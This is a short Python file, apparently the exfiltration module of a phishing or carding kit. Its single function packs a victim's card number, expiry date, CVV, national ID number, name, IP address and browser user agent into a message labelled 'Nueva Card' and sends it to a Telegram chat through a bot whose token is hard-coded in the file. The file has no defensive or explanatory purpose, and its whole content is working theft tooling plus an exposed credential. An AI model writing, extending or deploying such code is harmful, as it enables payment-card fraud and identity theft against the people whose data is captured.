import telebot
import geocoder


TOKEN = "8927384876:AAGKR6NLbwoCue_zra4tHCwGbKWlYVCiy6s"
CHAT_ID = "-5303523525"

bot = telebot.TeleBot(TOKEN)

def enviar_telegram(numcc, exp, cvv, dni, name, ip, user_agent):

    mensaje = (
        f"<----Nueva Card---->\n\n"
        f"Tarjeta: {numcc}\n"
        f"MM/AA: {exp}\n"
        f"CCV: {cvv}\n\n"
        
        f" ---- INFORMACIÓN ---- \n\n"
        f"DNI: {dni}\n"
        f"Nombre: {name}\n\n"

        f"IP: {ip}\n"
        f"User-Agent: {user_agent}\n\n"
        
        f"<----SABBATH---->"
    )
    bot.send_message(CHAT_ID, mensaje)

